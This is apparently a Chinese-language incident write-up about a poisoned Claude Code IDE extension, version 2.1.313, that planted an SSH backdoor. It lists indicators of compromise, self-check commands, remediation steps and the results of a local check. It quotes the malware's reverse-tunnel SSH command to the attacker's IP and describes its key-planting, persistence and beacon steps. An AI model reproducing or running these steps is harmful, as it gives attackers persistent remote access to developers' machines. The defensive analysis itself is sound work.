# Claude Code VS Code 扩展 2.1.313 被投毒：66 行加载器植入 SSH 后门（网络安全透视镜）

- **日期**：2026-10-30
- **来源**：微信公众号「网络安全透视镜」（引 OpenSourceMalware 逆向报告 + Cursor 安全公告）
- **分类**：03 行业动态（AI 工具供应链安全）
- **URL**：https://mp.weixin.qq.com/s/ZHlhajqJvu3iGpR-ZEBy5g
- **相关**：[黑色十月：AI Agent 安全事件](2026-10-22-black-october-ai-agent-security-incidents.md)

## 概述

10 月 29 日，扩展市场上出现冒用 `anthropic.claude-code` 标识的恶意版本 **2.1.313**。打包产物、图标、webview、内置二进制均为官方原件，**只改了 `extension.js`**：开头注入 66 行立即执行函数，扩展一加载就执行（无需开对话、无安装脚本）。

- **Open VSX**：OpenSourceMalware 逆向出完整样本；扩展所有者为 Anthropic 员工账号，是账号被控还是发布流程被利用尚无结论
- **Cursor 扩展市场**：10-29 02:27–13:35 PT 上架约 11 小时，影响上限 5,000 用户；Cursor 关停整个市场、轮换密钥后重建
- **微软 VS Code 市场**：仅出于谨慎建档，无证据表明发布过
- 目前**没有证据表明 Anthropic 官方发布渠道被攻破**；官方已发 **2.1.314**，2.1.313 已下架，攻击者服务器已被托管方下线
- 与 2026-07 NVDB 提示的 2.1.91–2.1.196 遥测隐患、2025-08 Open VSX 误标事件无关

## 载荷行为（66 行加载器）

1. **侦察**：主机名、用户名、OS/架构、主目录、工作目录、全局 Git 邮箱、最多 40 个含 KEY/TOKEN/SECRET/PASS/AWS/GCP 的**环境变量名**（不含值）。异常全部吞掉，扩展照常工作
2. **写公钥**：`~/.ssh/authorized_keys` 追加 Ed25519 公钥，注释 `svc-telemetry`
3. **开 SSH 服务**：macOS `systemsetup -setremotelogin on`；Linux `systemctl` 启 sshd；Windows 装 OpenSSH Server
4. **反向隧道**：内嵌私钥写入临时文件 `.stk_<标识>`，`ssh -N -R '*:0:localhost:22' tunnel@134.209.82.225`，关主机密钥校验，60 秒重连，优先 autossh。（Cursor 称因代码 bug 仅在管理员权限启动编辑器时才可能成功）
5. **持久化**：macOS `~/.config/.smt`、`.smtk`、`~/Library/LaunchAgents/com.apple.sysmond.plist`；Linux 同名脚本 + crontab `@reboot`；Windows `smt.cmd`/`smtk` + SysMon 计划任务或启动文件夹 `sysmon.cmd`
6. **信标**：查公网 IP（ifconfig.me / api.ipify.org）后明文 POST `http://134.209.82.225:8099/beacon`；不下载额外载荷

> Cursor：**卸载扩展不足以恢复信任**——持久化脚本在扩展移除后仍运行。

## IoC

| 类别 | 指标 |
|---|---|
| 包 | anthropic.claude-code@2.1.313 |
| 网络 | 134.209.82.225（:22、:8099/beacon） |
| SSH | tunnel@134.209.82.225 / 注释 svc-telemetry / SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk |
| 文件 | ~/.config/.smt、~/.config/.smtk、com.apple.sysmond.plist、${TMPDIR}/.stk_* |
| Windows | .config\smt.cmd、.config\smtk、SysMon 计划任务、sysmon.cmd |
| extension.js SHA256 | ecb58cb29078d9646ad1dcdbe51526f2d9cfea06be5fb2ab183e8ecc3ab6bf15 |
| 私钥指纹 | 7e0a52885fadee05544a9e99eb18c792bec05900a5e1a66d68f8383decb0e278 |

## 自查命令

```bash
# macOS / Linux
grep -qs svc-telemetry ~/.ssh/authorized_keys && echo "svc-telemetry key found" || echo "No key found"
ls -la ~/.config/.smt ~/.config/.smtk ~/Library/LaunchAgents/com.apple.sysmond.plist
ps aux | grep -E "autossh|ssh .*-R .*:0:localhost:22"
crontab -l | grep -E "smt|@reboot"
```

```powershell
Select-String -Path "$env:USERPROFILE\.ssh\authorized_keys","C:\ProgramData\ssh\administrators_authorized_keys" -Pattern "svc-telemetry" -SimpleMatch
Get-ScheduledTask -TaskName "SysMon" -ErrorAction SilentlyContinue
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Filter "sysmon.cmd"
```

## 处置顺序

1. 在终端/网络/扩展安装日志检索 IoC，确认是否加载过、是否落地
2. 有证据 → 先隔离、保全取证，**别一上来就卸载**
3. 删攻击者公钥 + 持久化项 + 隧道进程 + 卸载扩展，缺一不可
4. 在**干净设备**上轮换该主机可访问的凭证与令牌
5. 复查 SSH/Shell/进程/认证/网络日志；重装比假定已清干净更稳妥

## 本机自查结果（2026-10-30，McCleary HPC，dz288）

- `~/.ssh/authorized_keys` 及 `~/.ssh/bak/`：无 `svc-telemetry` / 攻击者公钥 ✅
- `~/.config/.smt`、`.smtk`、`/tmp/.stk_*`：不存在 ✅（/tmp 为节点本地，只查了当前节点）
- 无 autossh / 反向隧道进程，无到 134.209.82.225 的连接 ✅
- 无 VS Code / Cursor 服务端扩展目录（~/.vscode-server 等），未装 anthropic.claude-code 扩展 ✅
- crontab 对本用户禁用，不存在 `@reboot` 持久化 ✅
- Claude Code CLI 为 2.1.314；版本目录只有 2.1.311 / 2.1.312 / 2.1.314，**从未装过 2.1.313**（本次投毒针对 IDE 扩展，非 CLI）✅
- 未覆盖：个人 Mac/Windows 电脑上的 VS Code / Cursor，需本人用上面的命令自查

## 备注

- 事件特别之处在传播路径：开发者对 IDE 扩展高度信任，扩展加载即动手
- 建议：扩展升到 2.1.314+，关闭自动更新或固定版本；IDE 尽量不以管理员权限运行
